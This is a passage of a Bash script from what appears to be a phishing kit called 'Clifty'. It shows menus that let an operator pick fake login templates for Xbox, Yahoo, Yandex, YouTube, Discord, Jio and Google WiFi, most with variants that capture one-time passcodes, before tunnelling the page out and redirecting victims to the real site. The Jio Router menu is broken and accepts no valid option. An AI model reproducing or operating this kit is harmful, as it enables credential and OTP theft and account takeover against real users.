echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="xbox"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="xbox/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_xbox; };;
esac
}
#yahoo
site_yahoo(){
siname="Yahoo"
dgfname="yahoo"
rdurl="yahoo.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="yahoo"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="yahoo/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_yahoo; };;
esac
}
#yandex
site_yandex(){
siname="Yandex"
dgfname="yandex"
rdurl="yandex.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="yandex"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="yandex/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_yandex; };;
esac
}
#ytsubs
site_ytsubs(){
siname="YT subs"
dgfname="ytsubs"
rdurl="www.youtube.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="ytsubs"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="ytsubs/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ytsubs; };;
esac
}

#discord
site_discord(){
siname="Discord"
dgfname="discord"
rdurl="www.discord.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="discord"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="discord/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_discord; };;
esac
}
#jiorouter
site_jiorouter(){
siname="Jio Router"
dgfname="jiorouter"
rdurl="www.jio.com/business/jiofi"
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
 
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_jiorouter; };;
esac
}
#googlewifi
site_googlewifi(){
website="googlewifi"
rdurl="fiber.google.com/wifi/"
siname="Google WIFI"
dgfname="google_wifi"
sitype="Default"
tunnelmenu
}
#pattern
site_pattern(){
website="pattern"
rdurl=""
dgfname="pattern"
siname="Pattern"
sitype="Default"
tunnelmenu
}

##MAIN
clear
cbanner
directories
kill_pid
dependencies
xpermission
mainmenu
